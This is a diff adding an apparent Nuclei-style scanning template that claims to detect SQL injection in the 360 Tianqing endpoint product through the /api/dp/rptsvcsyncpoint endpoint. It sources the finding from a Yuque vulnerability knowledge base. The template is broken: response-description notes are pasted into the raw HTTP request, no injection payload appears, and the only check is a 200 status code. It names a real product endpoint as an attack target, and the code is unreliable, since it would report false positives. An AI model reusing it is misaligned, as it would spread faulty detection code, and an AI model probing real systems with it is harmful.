@@ -1,0 +1,34 @@
+id: poc-ar006fw7qc4368y6
+info:
+  name: 360天擎sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ar006fw7qc4368y6'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ar006fw7qc4368y6
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /api/dp/rptsvcsyncpoint?ccid=1 HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    success
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
